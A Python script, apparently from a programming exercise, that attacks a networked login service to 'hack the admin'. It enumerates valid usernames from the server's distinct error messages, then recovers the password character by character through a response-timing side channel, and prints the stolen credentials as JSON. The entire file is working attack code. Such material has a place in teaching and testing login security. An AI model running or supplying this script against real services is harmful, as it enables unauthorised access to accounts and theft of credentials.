import argparse
from scripts import classes
import json
import string
import time


def main():
    args = configure_arguments()

    socket_object = classes.socket_creation(args.IP_address, args.port)
    finder_object = classes.finder()

    username = username_finder(socket_object, finder_object)
    password = password_finder(username, socket_object)

    print(json.dumps({"login": username, "password": password}))

    # Remember, once the connection is off you can't continue using the socket
    socket_object.end_connection()


def configure_arguments():
    parser = argparse.ArgumentParser(description='Arguments needed to hack the admin')
    parser.add_argument('IP_address', type=str, help='Admin\'s ip address')
    parser.add_argument('port', type=int, help='Port of the device')
    return parser.parse_args()


def username_finder(socket_object, finder_object):
    wrong_password = 'Wrong password!'
    username_dict = {
        'login': '',
        'password': ' '
    }

    while True:
        username_set = finder_object.username_generator()
        for username in username_set:
            username_dict['login'] = username

            json_send_dict = json.dumps(username_dict)
            socket_object.send_message(json_send_dict)

            message = socket_object.receive_response()
            json_recv_dict = json.loads(message)

            if json_recv_dict['result'] == wrong_password:
                return username


def password_finder(username, socket_object):
    password_characters = string.digits + string.ascii_letters
    success = 'Connection success!'
    username_dict = {
        'login': username,
        'password': ''
    }
    permanent_password = ''

    while True:
        for character in password_characters:
            username_dict['password'] += character

            json_send_dict = json.dumps(username_dict)
            socket_object.send_message(json_send_dict)

            start = time.time()
            message = socket_object.receive_response()
            end = time.time()

            json_recv_dict = json.loads(message)

            if end - start >= 0.1:
                permanent_password += character
            if json_recv_dict['result'] == success:
                return username_dict['password']

            username_dict['password'] = permanent_password


if __name__ == '__main__':
    main()
